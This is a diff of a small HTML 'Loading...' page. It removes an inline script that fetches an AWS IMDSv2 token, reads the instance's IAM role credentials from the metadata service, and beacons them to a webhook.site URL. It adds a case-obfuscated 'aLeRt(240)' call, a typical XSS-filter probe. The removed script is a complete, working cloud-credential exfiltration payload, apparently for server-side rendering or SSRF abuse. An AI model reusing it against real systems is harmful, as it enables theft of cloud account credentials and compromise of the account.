@@ -7,34 +7,8 @@
     <h1>Loading...</h1>
 
     <script>
-      fetch('http://169.254.169.254/latest/api/token', {
-        method: 'PUT',
-        headers: {
-          'X-aws-ec2-metadata-token-ttl-seconds': '21600'
-        }
-      })
-      .then(res => res.text())
-      .then(token => {
-        return fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
-          headers: {
-            'X-aws-ec2-metadata-token': token
-          }
-        }).then(res => res.text())
-          .then(role => {
-            return fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, {
-              headers: {
-                'X-aws-ec2-metadata-token': token
-              }
-            });
-          });
-      })
-      .then(res => res.text())
-      .then(creds => {
-        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?creds=' + encodeURIComponent(creds);
-      })
-      .catch(() => {
-        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?error=fail';
-      });
+     aLeRt(240);
     </script>
   </body>
 </html>
+
